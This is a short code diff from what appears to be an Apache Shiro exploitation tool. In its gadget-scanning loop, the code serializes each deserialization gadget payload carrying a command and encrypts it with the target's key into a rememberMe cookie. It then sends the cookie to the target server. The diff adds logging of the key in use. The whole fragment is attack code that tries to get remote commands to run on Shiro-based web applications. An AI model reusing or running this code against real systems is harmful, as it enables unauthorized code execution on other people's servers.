@@ -47,15 +47,17 @@ public class GadgetScanner implements ShiroScanner {
 
         Set<Class<? extends ObjectPayload>> set = Payload.getAllPayloadClass();
         set.remove(ScanKey.class);
+        String key = target.getKey();
         for (Class<? extends ObjectPayload> payloadClass : set) {
             ShiroHttpConnection connection = new ShiroHttpConnection(target.getBase());
             String id = RandomID.randomID();
             String command = String.format(commandTemplate, identifier, id);
             ObjectPayload obj = payloadClass.newInstance();
+            System.out.println("[+] Use Key: " + key);
             System.out.println("[+] Test Gadget: " + payloadClass.getSimpleName());
             Object payload = obj.getObjectPayload(command);
             byte[] serialize = Util.serialize(payload);
-            String rememberMe = Util.getRememberMe(serialize, target.getKey());
+            String rememberMe = Util.getRememberMe(serialize, key);
             connection.sendRememberMe(rememberMe, false);
 
             Thread.sleep(500);
